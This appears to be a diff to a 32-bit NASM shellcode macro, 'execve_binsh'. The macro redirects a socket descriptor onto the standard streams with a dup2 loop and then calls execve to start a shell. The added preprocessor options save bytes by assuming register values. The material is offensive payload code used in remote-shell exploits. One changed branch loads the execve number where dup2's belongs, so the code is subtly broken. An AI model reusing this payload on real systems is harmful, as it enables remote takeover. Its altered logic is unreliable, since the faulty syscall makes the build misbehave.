@@ -25,6 +25,16 @@
 BITS 32
 
 ;;
+; Define undefined assumptions
+;;
+%ifndef ASSUME_REG_EDX
+%define ASSUME_REG_EDX -1
+%endif
+%ifndef ASSUME_REG_EAX
+%define ASSUME_REG_EAX -1
+%endif
+
+;;
 ;     Macro: execve_binsh
 ;   Purpose: Execute a command shell with various options
 ; Arguments:
@@ -45,12 +55,19 @@ BITS 32
 	%if %1 & EXECUTE_REDIRECT_IO
 
 dup:
+%ifdef FD_REG_EBX
+%else
 	mov  ebx, edi
+%endif
 	push byte 0x2
 	pop  ecx
 dup_loop:
+%if ASSUME_REG_EAX == 0
+	mov  al, 0xb
+%else
 	push byte 0x3f
 	pop  eax
+%endif
 	int  0x80
 	dec  ecx
 	jns  dup_loop
@@ -58,9 +75,16 @@ dup_loop:
 	%endif
 
 execve:
+%if ASSUME_REG_EAX == 0
+	mov  al, 0xb
+%else
 	push byte 0xb
 	pop  eax
+%endif
+%if ASSUME_REG_EDX == 0
+%else
 	cdq
+%endif
 	push edx
 
 	%if %1 & EXECUTE_DISABLE_READLINE
